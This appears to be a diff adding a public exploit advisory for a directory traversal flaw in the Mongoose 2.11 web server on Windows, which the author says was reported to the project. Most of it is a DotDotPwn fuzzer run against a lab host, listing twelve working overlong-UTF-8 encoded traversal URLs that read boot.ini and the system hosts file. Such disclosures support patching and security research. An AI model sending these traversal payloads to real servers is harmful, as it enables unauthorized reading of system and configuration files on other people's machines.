@@ -1,0 +1,94 @@
+# Exploit Title: Mongoose 2.11 Directory Traversal
+# Date: 29 Oct
+# Author: nitr0us (Alejandro Hernandez H.)
+# Software Link: http://mongoose.googlecode.com/files/mongoose-2.11.exe
+# Version: 2.11 (Windows Version)
+# Tested on: Windows XP Service Pack 2
+
+Chatsubo [(in)Security Dark] Labs
+http://chatsubo-labs.blogspot.com
+http://www.brainoverflow.org
+
+Previous directory traversal flaws were found in Mongoose. The latest one was 
+found by Gera from CORE Security at EKO Party 2009, but, there is still a flaw 
+in the latest version (2.11) which was found by DotDotPwn.
+
+I already reported the flaw in the Mongoose's issue tracking system.
+http://code.google.com/p/mongoose/issues/detail?id=90&q=traversal#c10
+
+
+EXPLOIT:
+************************************************************************************
+******* Released @ BugCon Security Conferences 2010 - http://www.bugcon.org ********
+************************************************************************************
+
+nitr0us@daiquiri ~ #./dotdotpwn.pl -m http -h 192.168.242.128 -x 8080 -O -s -d 3 -t 100 -q
+#################################################################################
+#                                                                               #
+#  CubilFelino                                                       Chatsubo   #
+#  Security Research Lab              and            [(in)Security Dark] Labs   #
+#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
+#                                                                               #
+#                               pr0udly present:                                #
+#                                                                               #
+#  ________            __  ________            __  __________                   #
+#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
+#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
+#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
+#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
+#          \/                      \/                                      \/   #
+#                               - DotDotPwn v2.1 -                              #
+#                         The Directory Traversal Fuzzer                        #
+#                         http://dotdotpwn.sectester.net                        #
+#                            dotdotpwn@sectester.net                            #
+#                                                                               #
+#                              by chr1x & nitr0us                               #
+#################################################################################
+
+[========== TARGET INFORMATION ==========]
+[+] Hostname: 192.168.242.128
+[+] Detecting Operating System (nmap) ...
+[+] Operating System detected:  Microsoft Windows XP SP2 or Windows Server 2003 SP0/SP1
+[+] Protocol: http
+[+] Port: 8080
+[+] Service detected:
+
+[=========== TRAVERSAL ENGINE ===========]
+[+] Creating Traversal patterns (mix of dots and slashes)
+[+] Multiplying 3 times the traversal patterns (-d switch)
+[+] Creating the Special Traversal patterns
+[+] Translating (back)slashes in the filenames
+[+] Adapting the filenames according to the OS type detected (windows)
+[+] Including Special sufixes
+[+] Traversal Engine DONE ! - Total traversal tests created: 2328
+
+[=========== TESTING RESULTS ============]
+[+] Ready to launch 10.00 traversals per second
+[+] Press any key to start the testing (You can stop it pressing Ctrl + C)
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/windows/system32/drivers/etc/hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\windows\system32\drivers\etc\hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e%2f%c0%2e%c0%2e%2f%c0%2e%c0%2e%2fboot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e%2f%c0%2e%c0%2e%2f%c0%2e%c0%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e%5c%c0%2e%c0%2e%5c%c0%2e%c0%2e%5cboot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e%5c%c0%2e%c0%2e%5c%c0%2e%c0%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:8080/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts <- VULNERABLE!
+
+[+] Fuzz testing finished after 10.18 minutes (611 seconds)
+[+] Total Traversals found: 12
